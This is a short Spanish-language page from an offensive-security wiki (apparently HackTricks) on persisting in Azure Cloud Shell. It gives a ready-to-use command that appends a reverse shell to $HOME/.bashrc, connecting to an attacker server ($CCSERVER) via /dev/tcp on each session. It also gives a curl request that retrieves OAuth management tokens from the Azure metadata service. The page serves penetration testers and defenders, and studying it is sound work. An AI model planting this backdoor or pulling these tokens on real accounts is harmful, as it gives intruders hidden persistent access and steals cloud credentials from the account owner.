# Az - Cloud Shell Persistence

{{#include ../../../banners/hacktricks-training.md}}

## Cloud Shell Persistence

Azure Cloud Shell ofrece acceso a la línea de comandos para gestionar recursos de Azure con almacenamiento persistente y autenticación automática. Los atacantes pueden explotar esto colocando puertas traseras en el directorio personal persistente:

* **Almacenamiento Persistente**: El directorio personal de Azure Cloud Shell está montado en un recurso compartido de archivos de Azure y permanece intacto incluso después de que la sesión termina.
* **Scripts de Inicio**: Archivos como .bashrc se ejecutan automáticamente al inicio de cada sesión, permitiendo la ejecución persistente cuando se inicia el cloud shell.

Ejemplo de puerta trasera en .bashrc:

{% code overflow="wrap" %}
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/$CCSERVER/443 0>&1 &)' >> $HOME/.bashrc
```
{% endcode %}

Este backdoor puede ejecutar comandos incluso 5 minutos después de que el usuario haya terminado con el cloud shell.

Además, consulta el servicio de metadatos de Azure para obtener detalles de la instancia y tokens:
{% code overflow="wrap" %}
```bash
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -s
```
{% endcode %}


{{#include ../../../banners/hacktricks-training.md}}
